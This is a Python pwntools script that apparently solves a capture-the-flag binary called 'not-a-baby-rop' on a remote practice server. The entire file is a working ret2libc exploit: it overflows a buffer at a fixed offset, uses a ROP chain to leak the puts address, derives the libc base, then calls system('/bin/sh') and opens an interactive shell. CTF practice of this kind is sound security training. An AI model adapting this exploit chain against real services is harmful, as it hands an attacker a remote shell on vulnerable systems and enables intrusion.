from pwn import *

HOST = "warzone.hackrocks.com"
PORT = 7770

elf = ELF('not-a-baby-rop')

DEBUG = True

if DEBUG:
	libc = elf.libc
	p = elf.process()
else:
	libc = ELF('libc.so')  # libc6_2.28-10+deb10u1_amd64
	p = remote(HOST, PORT)

rop = ROP(elf)

offset = 136

payload = flat([
	cyclic(offset),
	p64(rop.rdi.address),
	p64(elf.symbols.got.puts),
	p64(elf.symbols.plt.puts),
	p64(elf.entrypoint)
	])

# context.log_level = 'debug'

_ = p.recvuntil(b"let's see what u got\n")
p.sendline(payload)
leaked = unpack(p.recvuntil(b"let's see what u got")[:6], 'all')

print("Leaked", hex(leaked))
libc.address = leaked - libc.symbols.puts

print("Libc @ ", hex(libc.address))

payload = flat([
	cyclic(offset),
	p64(rop.rdi.address),
	p64(next(libc.search(b'/bin/sh\x00'))),
	p64(libc.symbols.system)
	])

p.sendline(payload)
p.interactive()
